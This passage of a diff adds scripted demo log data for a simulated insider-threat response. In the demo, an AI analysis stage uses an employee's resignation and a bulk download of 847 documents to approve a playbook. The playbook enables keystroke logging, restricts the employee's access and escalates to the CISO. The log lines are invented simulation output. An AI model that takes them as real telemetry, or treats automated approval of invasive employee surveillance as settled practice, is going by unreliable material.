+        "text": "[BODY] risk_score = HIGH | anomaly_types = [bulk_download, off_hours, resignation]",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Forwarding to The Brain for analysis...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN \u2014 AI Threat Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] Receiving detection BODY-INSIDER-ANON-f2a7c4...",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Loading governance: ai_governance_baseline.yaml",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] PII detection: employee name \u2192 REDACTED in analysis logs",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Bulk download: 847 docs (user's 90-day avg: 12/day)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Off-hours: 02:15 UTC, no prior off-hours access in 180d",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 HR context: resignation + 3-day notice period remaining",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Access pattern: sequential page downloads (scraping)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 Risk composite: HR + behavioral + volume \u2192 98th percentile",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Confidence: 88% \u2192 96% (HR signal + behavioral anomaly)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Recommended playbook: insider-threat-response v1.0.0",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE execution",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE \u2014 CLAW Playbook Execution \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading: insider-threat-response v1.0.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Step 1/3: increase_monitoring",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: BODY | action: elevate monitoring for user",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Full packet capture + keystroke logging enabled",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/3: restrict_access",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: EDGE | action: reduce to read-only, block exports",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Access restricted: read-only, downloads disabled",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/3: escalate_to_ciso",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: INTERNAL | action: CISO escalation with evidence",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Evidence package sent: 847 docs + HR context + timeline",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE EDGE \u2014 Enforcement \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Enforcing access restrictions...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] HMAC-SHA256 signature: VERIFIED \u2713",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 SharePoint: download permission revoked \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 Confluence: export disabled for user \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 VPN: session flagged for enhanced DLP inspection \u2713",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SIMULATION COMPLETE                                    \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Insider threat contained in 5.3s | Access restricted      \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced: SIMULATE mode active.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Analyzing behavior...",
+      "body_done": "Anomaly Detected",
+      "brain_active": "Correlating HR data...",
+      "brain_done": "Decision: APPROVE",
+      "purpose_active": "Restricting access...",
+      "purpose_done": "CISO Notified",
+      "edge_active": "Revoking permissions...",
+      "edge_done": "Threat Contained"
+    },
+    "success_metrics": "Time to Restrict: 5.3s | Docs at Risk: 847 | Access: Read-Only | CISO Escalation: Sent"
+  }
+}
